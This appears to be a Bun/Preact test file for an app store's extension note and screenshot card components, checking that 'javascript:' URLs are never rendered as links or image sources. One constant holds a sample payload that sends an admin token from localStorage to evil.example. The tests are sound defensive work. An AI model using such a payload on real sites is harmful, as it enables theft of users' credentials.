import { describe, expect, test } from 'bun:test';
import type { AppExtension } from '@bridgething/catalog';
import { isValidElement, type VNode } from 'preact';
import { renderToString } from 'preact-render-to-string';
import { ShotCard } from './store/parts';
import { ExtensionNote } from './store/ExtensionNote';

const STEAL = "javascript:fetch('https://evil.example/'+localStorage.getItem('bridgething:admin-token'))";

function anchors(node: unknown, found: VNode<{ href?: string }>[] = []): VNode<{ href?: string }>[] {
  if (Array.isArray(node)) {
    for (const child of node) anchors(child, found);
    return found;
  }

  if (!isValidElement(node)) return found;

  const element = node as VNode<{ href?: string; children?: unknown }>;
  if (element.type === 'a') found.push(element);
  anchors(element.props.children, found);
  return found;
}

function hrefs(node: unknown): (string | undefined)[] {
  return anchors(node).map(anchor => anchor.props.href);
}

describe('the extension note', () => {
  const extension: AppExtension = { desktop: true, permissions: ['all'] };

  test('links a github repo', () => {
    expect(hrefs(ExtensionNote({ extension, source: 'https://github.com/someone/thing' }))).toEqual([
      'https://github.com/someone/thing',
    ]);
  });

  test('a javascript source renders as no repository rather than a link', () => {
    expect(hrefs(ExtensionNote({ extension, source: STEAL }))).toEqual([]);
  });
});

function storeListing(screenshots?: string[], icon: string | null = null) {
  return {
    app: {
      id: '019e6701-13f8-71b5-ba04-85d326630e98',
      name: 'Calendar',
      description: 'Upcoming events.',
      author: 'JoeyEamigh',
      icon,
      ...(screenshots ? { screenshots } : {}),
      homepage: null,
      source: null,
      versions: [],
    },
    sourceUrl: 'https://apps.bridgething.com/catalog.json',
    newestCompatible: null,
    installedVersion: null,
    updateAvailable: false,
    alsoAvailableFrom: [],
    installs: 0,
    trending: 0,
    official: false,
  };
}

function imageSources(html: string): string[] {
  return [...html.matchAll(/<img[^>]* src="([^"]*)"/g)]
    .map(match => match[1]!)
    .filter(src => src !== '/car-thing-frame.webp');
}

describe('the store card', () => {
  test('leads with the screenshot when the catalog entry carries one', () => {
    const html = renderToString(
      <ShotCard listing={storeListing(['https://bridgething.com/shots/calendar.png'])} meta="" />,
    );

    expect(imageSources(html)).toContain('https://bridgething.com/shots/calendar.png');
  });

  test('an app with no screenshots or icon renders nothing but the device frame', () => {
    expect(imageSources(renderToString(<ShotCard listing={storeListing()} meta="" />))).toEqual([]);
  });

  test('a javascript screenshot or icon url never becomes an image source', () => {
    const html = renderToString(<ShotCard listing={storeListing([STEAL], STEAL)} meta="" />);

    expect(html).not.toContain('javascript:');
    expect(imageSources(html)).toEqual([]);
  });
});
